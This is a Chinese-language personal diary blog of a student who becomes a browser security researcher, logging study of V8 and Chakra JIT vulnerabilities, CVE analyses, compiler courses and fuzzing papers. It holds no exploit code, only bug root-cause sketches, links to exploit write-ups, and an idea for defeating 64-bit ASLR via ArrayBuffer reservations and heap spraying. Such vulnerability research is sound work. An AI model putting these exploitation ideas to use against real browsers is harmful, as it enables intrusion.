title="2018-5-3"></a>2018-5-3</h2><ol><li>下午在看书，然后突然接了玄武的面试，患得患失吧，之前面试都没这种感觉。</li><li>总结一下面试：<br>CTF和内核这种充数的不算，好歹面的是浏览器组。<br>主要是讲了v8的一个洞，然后oob有一个点没分析清楚，我需要透彻的再搞一下了，还是太菜。<br>感谢给我讲了这个点的sky师傅，面的时候被问到这里真心紧张了。<br>面了45分钟，口干舌燥，最后我提问的时候，问了自己读浏览器源码的方法是否合适，万分期望能过。<br>也问了我对各种缓解机制的了解，然后就是漏洞利用，我讲的每一个洞，都被问了怎么利用，这个答的太差了，真的只是说说思路了，自己搞，写exp，真的没试过……该提升这方面的技能了，不能停滞不前！</li><li>CTF暂时不玩了，在拿到offer之前。</li></ol><h2 id="2018-5-4"><a href="#2018-5-4" class="headerlink" title="2018-5-4"></a>2018-5-4</h2><ol><li>webkit技术内幕里关于v8有一些描述，有一些帮助。</li><li>理解了一下原型链是什么。</li></ol><h2 id="2018-5-5-9"><a href="#2018-5-5-9" class="headerlink" title="2018-5-5-9"></a>2018-5-5-9</h2><ol><li>有点忘了自己都做了什么？最近做的东西周期越来越长，分开来看每天都没什么好记的（都是借口……最近太兴奋和激动有点摸鱼）</li><li>玄武实验室的offer拿到了~我最初想要的都有了，以后只需要往着安全研究员和优秀黑客的方向继续努力就行。</li><li>最近有在翻v8的一些日语资料，翻完了会放出来吧，一边看资料一边查资料读slide打基础，还有鲸书准备读。</li></ol><h2 id="2018-5-10"><a href="#2018-5-10" class="headerlink" title="2018-5-10"></a>2018-5-10</h2><ol><li>继续翻v8 exploit的资料，大概翻完了1/3，看到了GC机制那里。</li><li>下午上机组实验太伤脑子了……茶，然后最近准备再调一个v8的oob写wp了，不过还得等等…一样一样来。</li><li>c++有点不熟了呀，还是要再搞搞……</li></ol><h2 id="2018-5-11"><a href="#2018-5-11" class="headerlink" title="2018-5-11"></a>2018-5-11</h2><ol><li>继续翻v8资料，理解引擎很重要，在此基础上调洞比起靠感觉还是要好点的，纯靠感觉容易偏。</li><li>翻完了gc，好像稍微懂一点了。</li><li>今天其实发生了很多事情吧，不过不方便写在日记里，就这样吧。</li></ol><h2 id="2018-5-12"><a href="#2018-5-12" class="headerlink" title="2018-5-12"></a>2018-5-12</h2><ol><li>继续翻v8，总算翻到了对象存储（其实这部分该最先讲吧……）</li><li>准备信息系统开发的答辩什么的，下周开始要准备复习功课了。</li></ol><h2 id="2018-5-13-14"><a href="#2018-5-13-14" class="headerlink" title="2018-5-13-14"></a>2018-5-13-14</h2><ol><li>今天把v8的ppt的引擎基础部分翻完了，入职的事情也都搞的差不多了，剩下就是在去之前好好努力了。</li><li>感觉路由器这种硬件可以玩玩……相对好挖洞呢。。</li></ol><h2 id="2018-5-15-6-9"><a href="#2018-5-15-6-9" class="headerlink" title="2018-5-15-6-9"></a>2018-5-15-6-9</h2><p>这段时间沉迷期末考试无法自拔？？？嘤嘤嘤<br>有个小插曲，因为弄错了考试时间导致挂科，吃一堑长一智。。。<br>好了，开始记笔记了。</p><h2 id="2018-6-10-11"><a href="#2018-6-10-11" class="headerlink" title="2018-6-10-11"></a>2018-6-10-11</h2><p>把v8 exploit的PPT翻译收了个尾，重新整理了下v8的学习思路。<br>从漏洞函数回溯调用路径，断点调试等，还有exp的常用思路。</p><h2 id="2018-6-12-14"><a href="#2018-6-12-14" class="headerlink" title="2018-6-12-14"></a>2018-6-12-14</h2><p>最近脚上起了个小疮去了两趟医院，走路还好疼，真的是非常不顺利了。</p><h2 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018-6-15"></a>2018-6-15</h2><p>在mac上编译了v8，之前是在win上编译的，不得不说……有个坑点就是在16.04上面，不checkout到旧的分支，是无法编译成功的，耽误了一天。<br>然后认真的研究了一下fast Properties和hidden class，拿gdb打debugprint看了很多东西学习，记笔记记笔记。</p><h2 id="2018-6-16"><a href="#2018-6-16" class="headerlink" title="2018-6-16"></a>2018-6-16</h2><p>翻译了Source to Binary Jounrney of V8 javascript engine<br>categories，get了新知识，v8的体系结构还要多调试理解。<br>另外，再需要啃一本鲸书，理解一下编译优化技术。</p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018-6-17"></a>2018-6-17</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-180229.png" alt="">积累着读了一点PPT<br>突然发现也已经看了和写了，还调试了不少东西了，慢慢的对v8从生疏到开始渐渐熟悉，不过到挖掘漏洞的方法论可能还要再过一段时间吧。<br>毕竟v8代码我都没咋读过，翻翻pipeline.cc了解下Turbofan的一些API</p><h2 id="2018-6-18"><a href="#2018-6-18" class="headerlink" title="2018-6-18"></a>2018-6-18</h2><p>学习了阅读v8的bytecode，和了解bytecode的生成和解释执行还有to graph的过程</p><h2 id="2018-6-19"><a href="#2018-6-19" class="headerlink" title="2018-6-19"></a>2018-6-19</h2><p>今天开始要复习一点算法呢。<br>学习了v8增加的gdb命令使用,读了<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a><br>真的难懂，看了一下午，没什么头绪。。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-19-115842.jpg" alt=""><br>关于代码生成，Builtins和Runtime还是云里雾里，头疼。<br>写了个小工具来转换unsigned long long和double<br>v8的对象存储又看了一遍。。。结果今天还是没复习算法。。睡觉睡觉。</p><h2 id="2018-6-20-21"><a href="#2018-6-20-21" class="headerlink" title="2018-6-20-21"></a>2018-6-20-21</h2><p>搬家，寄了一些东西回家，整理了整理书，虽然我看的都是电子书，但是还是存了这么多呀。<br>三年不长，但也不短。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-21-173058.jpg" alt=""><br>晚上收拾了我最后一点东西，把入职需要的材料办完，要走了呢。</p><h2 id="2018-6-22-23"><a href="#2018-6-22-23" class="headerlink" title="2018-6-22-23"></a>2018-6-22-23</h2><p>复习了几道动态规划的算法题，要考试啦。<br>另外最好的消息是迟到了。。只做了十分钟的计算机组成原理居然及格了。。感谢老师，师生情太深了，感动感动。<br>这段时间发生了不少事情，然后让我又想明白了一些事情，这段时间确实，没怎么学的进去，学的并不好。<br>今天看了蛮久的漏洞，不知道其他人是什么样，但是在我最烦最难受的时候，安全研究是最能让我平静下来的一件事情。<br>我喜欢这样，虽然目前很多地方做的并不好，但是可以慢慢学习~<br>写了个case CVE-2016-1646，还有另外一个JIT的洞，有点难懂。</p><h2 id="2018-6-24-25"><a href="#2018-6-24-25" class="headerlink" title="2018-6-24-25"></a>2018-6-24-25</h2><p>调v8一个麻烦就是编译，得想个办法.<br><a href="http://eternalsakura13.com/2018/06/26/v8_environment/">http://eternalsakura13.com/2018/06/26/v8_environment/</a><br>总算是搞定了，最近一些技术文章读的少了，思路不够开阔，学习学习……<br>还有算法考试要到了。。趴桌，继续在看动态规划和贪婪</p><h2 id="2018-6-26"><a href="#2018-6-26" class="headerlink" title="2018-6-26"></a>2018-6-26</h2><p>学习了CVE-2016-5198，原理就是在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><p>都还需要总结（</p><h2 id="2018-6-27-28"><a href="#2018-6-27-28" class="headerlink" title="2018-6-27-28"></a>2018-6-27-28</h2><ol><li>看了一些内核的资料，整理整理，顺便给人鸡汤了一下。。</li><li>刷算法，准备期末。。凉了啊。。</li></ol><h2 id="2018-6-29"><a href="#2018-6-29" class="headerlink" title="2018-6-29"></a>2018-6-29</h2><ol><li>累的要死的一天,飞机晚点了三个小时，卒……</li><li>看了一些资料，学会了如何成为一个合格的安全研究员（打了鸡血</li><li>在mathias这里住下了~New story要开始了</li></ol><h2 id="2018-6-30-7-2"><a href="#2018-6-30-7-2" class="headerlink" title="2018-6-30-7-2"></a>2018-6-30-7-2</h2><ol><li>这两天在忙着入职，装电脑和认识同事。</li><li>和导师说了自己最近在做什么，从tools和Bug study的角度，然后他让我继续搞v8，得偿所愿，不过估计要干活要明天了，说是要分析的洞还没给我。</li><li>[ Browser ]  Microsoft Edge Chakra 引擎 UAF 漏洞分析 (CVE-2018-0946)：<a href="https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3</a></li><li>[ Browser ] CVE-2018-5146<br><a href="http://blogs.360.cn/blog/how-to-kill-a-firefox/" target="_blank" rel="noopener">http://blogs.360.cn/blog/how-to-kill-a-firefox/</a><br>A神之前就说在写一个没有poc的exp，不知道是不是这个洞，突然想到。<br>others（同事写的root cause和exploit，还有怎么用shadow来分析堆，很有意义。</li><li>看了鲸书1-4章，不少熟悉的名词……interesting</li></ol><h2 id="2018-7-3"><a href="#2018-7-3" class="headerlink" title="2018-7-3"></a>2018-7-3</h2><p>刚入职这段时间确实是最宽松的一段时间了，只需要学习就行了，没有什么其他KPI，后面应该就多了。<br>今天分析CVE-2017-0234，不过主要花时间都花在环境搭建上，漏洞触发和分析并不难，或者说还好。</p><h2 id="2018-7-4"><a href="#2018-7-4" class="headerlink" title="2018-7-4"></a>2018-7-4</h2><ol><li>今天把CVE-2017-0234的分析报告初版写完了，掌握了vs和windbg的两种很棒的调试方法，然后在编译v8，算是学到了一点东西，得再加强code review的能力。</li><li>成功在win上编译好了v8，可以玩一下。</li></ol><h2 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018-7-5"></a>2018-7-5</h2><ol><li>0234还要分析第二版，不过还不急，今天在自己分析其他v8的漏洞，一个p2o的洞的利用，思路真是棒，学到了学到了~<br><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></li></ol><h2 id="2018-7-6"><a href="#2018-7-6" class="headerlink" title="2018-7-6"></a>2018-7-6</h2><ol><li>上班摸鱼好几天，今天下午听了各个大佬每周做的事情和科总的分享，觉得要走的路还很长。</li><li>目前的计划：<br>先看一些代码和语言标准；<br>talk和blog（可以看看如何移植v8，并思考其中可能出现的漏洞<br>Firefox的<a href="https://github.com/MozillaSecurity/funfuzz/tree/master/src/funfuzz/js/jsfunfuzz" target="_blank" rel="noopener">fuzz</a>（编译原理不止要领会意义，更要能写出来。<br>另外是关于win下用到了v8的各种软件的调试，也是一个学习面（比如可以看看漏洞战争等资料学习windbg和常规利用）</li></ol><p><strong>你要用较少的时间走完别人走了很久的路，所以你要跑起来，要飞快地跑起来。</strong></p><ol start="3"><li>和导师聊过自己分析的第一版漏洞，发现很多问题，我需要更深入的思考。其实安全研究有点像一个侦探游戏，每一行都是线索，我漏掉一点东西就拼不出完整的拼图。（因缺思厅<br>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?<br>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）<br>（去掉边界的代码是三行，代表一个JIT生成的可选项，为什么要这么选？）</li></ul><h2 id="2018-7-7"><a href="#2018-7-7" class="headerlink" title="2018-7-7"></a>2018-7-7</h2><ol><li>今天上午去办了个房卡，一个月4000，押二付一，资产清零2333，其实居住条件就一般啦，只是离公司近，方便加班（摸鱼）</li><li>今天和朋友聚了个餐，以后就全吃公司救济粮了~</li><li>继续看0234，直接挂win API没调到点子上，但是最后还是换了个想法搜到了。。还行。。方向没错。</li><li>思考和调试新的攻击方法，趴桌。</li></ol><h2 id="2018-7-8"><a href="#2018-7-8" class="headerlink" title="2018-7-8"></a>2018-7-8</h2><ol><li>把0234第二版写好了（调试分析昨天已经结束了，今天只是整理文案……）</li><li>然后看c++对象模型，很有意思。</li><li>研究了一下js fuzzer</li><li>继续思考和调试某个洞（或者说软件）的新的攻击方法。</li></ol><h2 id="2018-7-9"><a href="#2018-7-9" class="headerlink" title="2018-7-9"></a>2018-7-9</h2><ol><li>下午就是在部署fuzz和抄代码,然后xx发了个webkit的洞，我看看……还有公司推送了一个dlmalloc的。。都看看</li><li>导师说我写的FUZZ是浪费时间2333，嗯，是这样的，我不用太心急，这就是有人带的好处……很多点能够及时纠正（然后一下午没了2333<br>沿着各个组件，各个组件都出过什么漏洞这个线索去分析好了，人的力量才是无穷大的。<br>嗯，先把思路和相关知识建立起来。</li></ol><h2 id="2018-7-10-11"><a href="#2018-7-10-11" class="headerlink" title="2018-7-10-11"></a>2018-7-10-11</h2><ol><li>在这找test看，<a href="https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/</a></li><li>v8相关的索引，<a href="https://v8.paulfryzel.com/docs/master/index.html" target="_blank" rel="noopener">https://v8.paulfryzel.com/docs/master/index.html</a></li><li>看每天的commit，<a href="https://github.com/v8/v8/commits/master" target="_blank" rel="noopener">https://github.com/v8/v8/commits/master</a></li><li>看gpz的漏洞，每天写一篇分析（当然不可能放出来（逃<br><a href="https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725" target="_blank" rel="noopener">https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725</a></li><li>最近在思考一些个人研究是否要放博客上，仔细想了想还是算了，漏洞理解的思路，比很多东西要宝贵吧。</li></ol><h2 id="2018-7-12"><a href="#2018-7-12" class="headerlink" title="2018-7-12"></a>2018-7-12</h2><ol><li>现在想要挖到洞，想学会漏洞利用，顺便，月乃安利了一个repo,PPP的<a href="https://github.com/theori-io/pwnjs" target="_blank" rel="noopener">https://github.com/theori-io/pwnjs</a></li><li>这两天可能因为一些原因心情异常烦躁，一方面是弱的不行的自己，一方面是想要的更多，哇，真想哭……好了，杂事就不管了，我又不是神，怎么可能面面俱到。</li><li>闭关，博客会更新日记，在有一定系统化的总结思路之前，博客不会再更新文章了（日更变月更？）</li></ol><h2 id="2018-7-13"><a href="#2018-7-13" class="headerlink" title="2018-7-13"></a>2018-7-13</h2><p>今天开了个组会，可以说是非常开心了……<br>每天东看瞎看，没看点有用的东西……（发呆</p><p>然后导师给了我下一版要继续分析清楚的点。</p><ol><li>VritualAlloc分配的和GC管理的区别，GC机制</li><li>开发者为什么这么设计这个？为什么之前不限制4GB<br>（明明超过4GB就会OOB，为什么还去掉上界，他们就真的是觉得4GB足够大？其实不是；patch补的其实是没问题的，虽然依然可以dos，但是这个不是大问题，应该还是要从GC的角度去再思考一下，或者其他？）</li><li>这个内存管理是实现有问题还是设计有问题？实现有问题那么还有哪些地方是这么实现的，设计同理。要比开发者更了解他们所写的软件（：<br>安全研究的本质还是回归到对开发者的代码的深层次理解，一层一层的往下深挖，才能挖到线索，挖到真相（</li></ol><p>太菜了太菜了……受不了我自己了……<br>今天的收获是和刘炜师傅指点了我好多，一些源码里的疑问搞的清楚了，还解决了其他问题，nice……每天学的都比较痛并快乐着了。</p><h2 id="2018-7-14"><a href="#2018-7-14" class="headerlink" title="2018-7-14"></a>2018-7-14</h2><p>一觉睡到下午一点半……23333，还好周末，不过平常起得也不早，还好在玄武，要不然要被开了……<br>然后晚上和川神还有夜影他们约了个饭，感觉还不错~(然后吃完了滚回来加班)<br>今天看了点chakra，分析了cve-2016-7189，用英文写了wp，明天再整理一下pattern（root cause比较好写，只是关于callback我调了一下，挺好玩的）<br>type confused还是很普遍的漏洞，但是其实还是不大好覆盖到每个点去看，有没有什么好思路呢（发呆</p><h2 id="2018-7-15-18"><a href="#2018-7-15-18" class="headerlink" title="2018-7-15-18"></a>2018-7-15-18</h2><p>这几天真的有点懵……或者说有点迷茫，开始搞chakra，代码还是那么难啃，不过比v8好搞多了……<br>关于开发者的假设最后还是弄清楚了，其实就还好，是我分析的时间间隔有点长，没直接串起来，一个宽度问题。<br>在想明白之前觉得自己要被开了，现在还好。<br>今天游走了一天，把zdi的博客上的一些分析看了，有点意思，但是还不够。<br>另外我又要继续分析了。<br>为什么VirtualAlloc比GC更不安全，GC机制。<br>导师让我找几个渲染引擎的老的UAF洞看看~（估计就16年的吧<br>感觉又要踩坑……<br>搭了一个VPN服务器，这样就不用担心v8拉取不下来了……<br><a href="https://cloud.tencent.com/developer/article/1154896" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1154896</a><br>人生苦短我用docker</p><h2 id="2018-7-19-24"><a href="#2018-7-19-24" class="headerlink" title="2018-7-19-24"></a>2018-7-19-24</h2><ol><li>看了看雪峰会，sky师傅讲浏览器的议题很有意思。</li><li>看洞，整理一些loki的洞看。</li><li>准备开始JIT之旅<br>TODO List</li></ol><p>中科大的编译原理课程，比较简单<br><a href="http://mooc.study.163.com/course/1000002001?tid=1000003000#/info" target="_blank" rel="noopener">http://mooc.study.163.com/course/1000002001?tid=1000003000#/info</a><br><a href="http://staff.ustc.edu.cn/~bjhua/courses/compiler/2014/" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~bjhua/courses/compiler/2014/</a></p><p>斯坦福的CS143，编译基础<br><a href="https://lagunita.stanford.edu/courses/Engineering/Compilers/Fall2014/about" target="_blank" rel="noopener">https://lagunita.stanford.edu/courses/Engineering/Compilers/Fall2014/about</a><br>斯坦福的CS243，编译优化<br><a href="http://infolab.stanford.edu/~ullman/dragon/w06/w06.html" target="_blank" rel="noopener">http://infolab.stanford.edu/~ullman/dragon/w06/w06.html</a></p><p>CMU，编译基础<br><a href="http://www.cs.cmu.edu/~rjsimmon/15411-f15/" target="_blank" rel="noopener">http://www.cs.cmu.edu/~rjsimmon/15411-f15/</a><br>CMU，编译优化<br><a href="http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15745-s16/www/" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15745-s16/www/</a></p><ol start="4"><li>pizlo的PPT很nice<br><a href="http://www.filpizlo.com/slides/pizlo-dls2017-vmil2017-jscvm-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-dls2017-vmil2017-jscvm-slides.pdf</a></li><li>开始0236……</li></ol><h2 id="2018-7-25-26"><a href="#2018-7-25-26" class="headerlink" title="2018-7-25-26"></a>2018-7-25-26</h2><p>分析漏洞更深入了，思考的过程和思路慢慢搭起来了。<br>今天开始看编译原理。记录一些有趣的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">perfect hashing</span><br><span class="line">1. 什么是（关键字的）完美哈希？</span><br><span class="line">没有关键字冲突的哈希函数</span><br><span class="line">2. 如何构造完美哈希？试列举一到两种算法。</span><br><span class="line">目前用的比较多的是gperf算法</span><br><span class="line">为什么需要构造完美哈希？用关键字单链表是否f可以？</span><br><span class="line">因为完美哈希一次匹配，的时间效率为O(1),而链表要扫描一遍，时间效率为O(N)</span><br></pre></td></tr></table></figure><p>正则表达式代码生成工具<br><a href="http://www.txt2re.com/" target="_blank" rel="noopener">http://www.txt2re.com/</a><br>NFA-&gt;DFA,有限状态自动机</p><p>递归下降分析算法<br>LL(1),ANTIR</p><h2 id="2018-7-27"><a href="#2018-7-27" class="headerlink" title="2018-7-27"></a>2018-7-27</h2><p>总结一下今天，组会上分享的刚好是浏览器相关的东西，学到很多，此外最重要的是听了别人每周在干什么，也慢慢的知道了自己以后研究该看什么。<br>此外就是在看编译原理了，JIT始终是一个大的攻击面，而且写js/dom fuzz也绕不开编译原理，要吃掉这块始终不容易。。我还是太菜了。</p><h2 id="2018-7-28-29"><a href="#2018-7-28-29" class="headerlink" title="2018-7-28-29"></a>2018-7-28-29</h2><ol><li>这两天看了realworld ctf,和继续学习编译原理,看的还算快。。</li><li>spectre的漏洞利用和同事聊了一下，还是没做出来这个题，等官方wp学习一下，说来长亭这个比赛很有意思了……<br>说来vm escape已经变成常规题了……23333，可以学习一个了…<br>代码量还是不够啊，等这段时间搞完，就大量抄和读了……（没什么自己的需求，就不自己写了）<br>积累积累积累</li></ol><h2 id="2018-7-30"><a href="#2018-7-30" class="headerlink" title="2018-7-30"></a>2018-7-30</h2><p>终于看得懂《IFuzzer: An Evolutionary Interpreter Fuzzer<br>Using Genetic Programming》说的什么了。<br>不过确实有局限性，充其量是个demo，想自己写一个了。<br>commit要看，标准要读，漏洞要调，代码要写。<br>小孩子才做选择，我全都要。</p><h2 id="2018-7-31-8-2"><a href="#2018-7-31-8-2" class="headerlink" title="2018-7-31-8-2"></a>2018-7-31-8-2</h2><p>ctf pwn中的v8漏洞利用的坑差不多结了。。思路很多但是终究还是那些东西，利用都是好搞的，回归挖洞（笔记不放）</p><p>学会用antlr4（词法/语法分析）写点东西开了个头。。不过预计搞起来也很快<br>（IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming）<br>主要是参考这篇paper学习一下，有很多想法了。</p><p>然后剩下的主要工作就是学习编译优化，审计一下v8的JIT（看刘炜师傅写的两篇wp很有启发，看得出他对v8 IR有很多理解了，我也可以就这一块多做一些总结输出。。。</p><p>和朋友聊了一下，有的东西没有想象中的难，赶紧做出点东西，然后往前走吧。</p><h2 id="2018-8-3"><a href="#2018-8-3" class="headerlink" title="2018-8-3"></a>2018-8-3</h2><ol><li>日子一天天的过……今天发工资了蛮开心2333</li><li>今天分享的东西蛮有意思，听大家说这周做了什么，关于Fuzz的讨论也有意思，貌似有点上路了，这些基础的积累都是有意义的。</li><li>这周清理了一些坑，然后挖了更多坑，结了antlr4之后准备开始污点分析之旅了。<br>顺手列一下煜博推荐的paper：<br>All You Ever Wanted to Know About<br>Dynamic Taint Analysis and Forward Symbolic Execution (but might have been afraid to ask)<br>VUzzer: Application-aware Evolutionary Fuzzing<br>Towards Efficient Heap Overflow Discovery</li><li>发现一个好玩的网站的样子：<a href="http://www.vxjump.net/" target="_blank" rel="noopener">http://www.vxjump.net/</a></li><li>最后再贴一个编译优化的，还是CMU的，不过年份不同。<br><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html</a></li><li>本来最后了，不过还有新的最后，……<br>sky师傅和我讲下一步干嘛了。</li></ol><p>最后和我说了一下，其实ArrayBuffer的这种分配方式，可以完美bypass 64位ASLR<br>其实这里又涉及一个点，那就ASLR的必要条件是虚拟地址空间足够大，而我们的物理地址空间很小，不可能堆喷喷满。<br>但是……我们可以用0x10000的内存去占位4G，那么其实只要喷2G就可以了……这就bypass了，2333</p><p>这些小特性，大特性，系统特性，各种特性的深入理解和消化绝对是十分重要的。<br>我体验了一次如何从0234发现0236的过程，收获颇丰。</p><h2 id="2018-8-4-9"><a href="#2018-8-4-9" class="headerlink" title="2018-8-4-9"></a>2018-8-4-9</h2><ol><li>结束了antlr4的学习，fuzz进程挂起。</li><li>开始看v8源码，真多……真难懂2333……我好菜。</li><li>听同事说，有人看了两个月编译优化被开了。。好方。。加班看书看到2点。。<br>找到一个不错的PPT。<a href="http://sei.pku.edu.cn/~xiongyf04/SA/2015/" target="_blank" rel="noopener">http://sei.pku.edu.cn/~xiongyf04/SA/2015/</a></li><li>今天和sky师傅聊了一下，收获很多，思路很重要，不仅是挖洞的思路，调洞的思路，学习的思路，分析的思路，都很重要。</li><li>今天花时间整理了一下gpz的洞和bugs上能找到的JIT的洞，还是挺凌乱的，也开始思考一些JIT的攻击面的本质，结点的处理等等，把文件都翻了一下。</li></ol><h2 id="2018-8-9-18"><a href="#2018-8-9-18" class="headerlink" title="2018-8-9-18"></a>2018-8-9-18</h2><ol><li>好像很久没写日记了。。不知道为什么。。可能是突然泄气，人的情绪总是飘忽不定，对我们这种人更是如此。</li><li>还是写一下这段时间做了什么，还是JIT、JIT、JIT，说来我是从什么时候开始想要挖浏览器漏洞呢？为什么选择这么一条路呢？回忆一下又觉得当年浪费了太多时间在无意义的事情上（比如CTF，Android），应该好好看webkit的……叹气<br>不过说来这几天看到的JIT的资料还不错，大宝写了JIT漏洞的分析。<br><a href="http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf</a><br><a href="https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf" target="_blank" rel="noopener">https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf</a><br><a href="https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/" target="_blank" rel="noopener">https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/</a><br>从目前js引擎的攻击面来看，wasm和JIT可能是最可能出洞的点了。。也不好搞也不好搞2333<br><a href="https://googleprojectzero.blogspot.com/2018/08/the-problems-and-promise-of-webassembly.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2018/08/the-problems-and-promise-of-webassembly.html</a></li><li>周六睡到中午，然后去了长亭的“无pwn不欢”线下沙龙，领了衣服和杯子，感动。<br>冠成大佬的分享很nice，似乎一下子点出了我觉得逆向越来越迷的关键……<br><a href="https://github.com/A7um/slides/blob/master/2018/re_methodology.pdf" target="_blank" rel="noopener">https://github.com/A7um/slides/blob/master/2018/re_methodology.pdf</a><br>链接:<a href="https://pan.baidu.com/s/1K6Wdj1L6Dt5LJb7R-7GLhA" target="_blank" rel="noopener">https://pan.baidu.com/s/1K6Wdj1L6Dt5LJb7R-7GLhA</a>  密码:jgks</li><li>之前冠成大佬经常逆国产小软件挖洞，然后我一直不知道是咋搞的。。</li></ol><p><strong>现在想想，或许能够熟练的掌握trace+disassembly/指令记录+分析，这样的一种逆向能力，是十分重要的（如果是国产小软件，再加上如何从二进制文件搜索开源代码吧）</strong><br><strong>至于说，和做CTF一样，逆向各种神奇的架构和算法，我觉得是没必要的。</strong><br>嘛，虽然我还都不会，不过姑且给自己找到了一个学习的思路和方法，还是收获蛮多。<br>5. 这段时间的主要工作是在分析CVE-2017-5121，关于v8 escape analysis phase，不过没有patch，这个漏洞是发生在6.1版本之前，6.2之后换掉了整个escape analysis，重新实现了一遍。<br>这个漏洞实际上是逃逸分析将一个对象分析为不会逃逸后，将其初始化节点删除，而又有LoadElement/LoadField的节点使用它。本质上是由于有依赖关系的节点的访问顺序不正确导致的。</p><h2 id="2018-8-19"><a href="#2018-8-19" class="headerlink" title="2018-8-19"></a>2018-8-19</h2><ol><li>真的是硬生生赖床到一点半，饿的要死了才爬起来上班……</li><li>试图去搜和v8有关的design paper读，但是没找到，ORZ。。浪费时间。。</li><li>分析load elimination phase，学到不少东西。</li></ol><h2 id="2018-8-20"><a href="#2018-8-20" class="headerlink" title="2018-8-20"></a>2018-8-20</h2><p>我觉得挖edge怕不是loki的KPI吧。。又是挖了一堆，其中有一个还和大宝的撞了，是不是大佬的思路都是一样的……ORZ<br>今天可以分析学习一个。<br>今天各种填学校回去要交的材料，然后申请盖章，ORZ。<br>各种麻烦死。</p><ul><li>[Edge]  [CVE-2018-8298] [1582]   1582 - Microsoft Edge: Chakra: Bugs in InitializeNumberFormat and InitializeDateTimeFormat - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1582" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1582</a></li><li>[Edge]  [None] [1578]   1578 - Microsoft Edge: Chakra: JIT: Type confusion with InlineArrayPush - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1578" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1578</a></li><li>[Edge]  [CVE-2018-8291] [1576]   1576 - Microsoft Edge: Chakra: DictionaryPropertyDescriptor::CopyFrom doesn’t copy all fields - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1576" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1576</a></li><li>[Edge]  [CVE-2018-8279] [1570]   1570 - Microsoft Edge: Chakra: Parameter scope parsing bug - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1570" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1570</a></li><li>[Edge]  [CVE-2018-8288] [1565]   1565 - Microsoft Edge: Chakra: JIT: ImplicitCallFlags check bypass with Intl - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1565" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1565</a></li></ul><h2 id="2018-8-21"><a href="#2018-8-21" class="headerlink" title="2018-8-21"></a>2018-8-21</h2><ol><li>昨天看的一点点东西更新了一篇笔记，就当理理思路了。</li><li>昨天要的证明总算开下来了，心里松了一口气，下面调整一下自己的作息，好好工作了。</li><li>R大讲了一些turboFan IR设计的东西，给了一些paper读，非常nice<br><a href="https://www.zhihu.com/question/290982869/answer/474629999" target="_blank" 